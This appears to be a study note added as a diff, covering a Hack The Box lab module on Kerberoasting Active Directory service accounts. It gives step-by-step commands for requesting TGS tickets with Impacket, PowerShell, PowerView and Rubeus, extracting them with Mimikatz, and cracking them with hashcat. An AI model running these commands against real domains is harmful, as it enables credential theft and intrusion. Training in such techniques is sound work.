@@ -1,0 +1,136 @@
+# Linux
+This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. 
+Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
+- Using the compromised domain account, the attacker requests a Kerberos service ticket (specifically a TGS, or Ticket Granting Service) for the targeted SPN from the KDC.
+- The KDC responds with a TGS ticket, which is encrypted with the service account’s NTLM password hash.
+- The TGS ticket contains a portion encrypted with the service account’s password hash
+- The extracted TGS ticket is taken offline to perform a brute-force or dictionary attack against the encrypted portion using tools like Hashcat or John the Ripper.
+## Kerberoasting - Performing the Attack
+
+Depending on your position in a network, this attack can be performed in multiple ways:
+- From a non-domain joined Linux host using valid domain user credentials.
+- From a domain-joined Linux host as root after retrieving the keytab file.
+- From a domain-joined Windows host authenticated as a domain user.
+- From a domain-joined Windows host with a shell in the context of a domain account.
+- As SYSTEM on a domain-joined Windows host.
+- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.
+Several tools can be utilized to perform the attack:
+- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
+- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
+## Kerberoasting with GetUserSPNs.py
+#### Listing SPN Accounts with GetUserSPNs.py
+```shell-session
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+#### Requesting all TGS Tickets
+```shell-session
+ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+```
+#### Requesting a Single TGS ticket
+```shell-session
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+```shell-session
+-outputfile sqldev_tgs
+```
+#### Cracking the Ticket Offline with Hashcat
+```shell-session
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+```
+
+
+# Windows
+## Kerberoasting - Semi Manual method
+To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.
+#### Enumerating SPNs with setspn.exe
+```cmd-session
+setspn.exe -Q */*
+```
+We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`.
+#### Targeting a Single User
+```powershell-session
+> Add-Type -AssemblyName System.IdentityModel
+> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):
+- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
+- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
+- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
+- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
+- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
+#### Retrieving All Tickets Using setspn.exe
+```powershell-session
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
+
+### Extracting Tickets from Memory with Mimikatz
+```cmd-session
+mimikatz # base64 /out:true
+
+mimikatz # kerberos::list /export  
+```
+If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
+#### Cracking
+```shell-session
+ echo "<base64 blob>" |  tr -d \\n 
+```
+```shell-session
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+```shell-session
+python2.7 kirbi2john.py sqldev.kirbi
+```
+#### Modifiying crack_file for Hashcat
+```shell-session
+GANGADHAR565@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file >
+sqldev_tgs_hashcat
+```
+```shell-session
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
+
+
+## Automated / Tool Based Route
+#### Using PowerView to Enumerate SPN Accounts
+
+```powershell-session
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Get-DomainUser * -spn | select samaccountname
+```
+```powershell-session
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+#### Exporting All Tickets to a CSV File
+```powershell-session
+PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+## Using Rubeus
+We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+
+```powershell-session
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn
+```
+#### Using the /stats Flag
+stats gives the information regarding the kerberoastable users
+we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year and etc..
+```powershell-session
+PS C:\htb> .\Rubeus.exe kerberoast /stats
+```
+`nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+#### Using the /nowrap Flag
+```powershell-session
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+## A Note on Encryption Types
+Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests. This is because RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
+#### Cracking the Ticket with Hashcat & rockyou.txt
+```shell-session
+GANGADHAR565@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+```
+#### Checking Supported Encryption Types
+```powershell-session
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
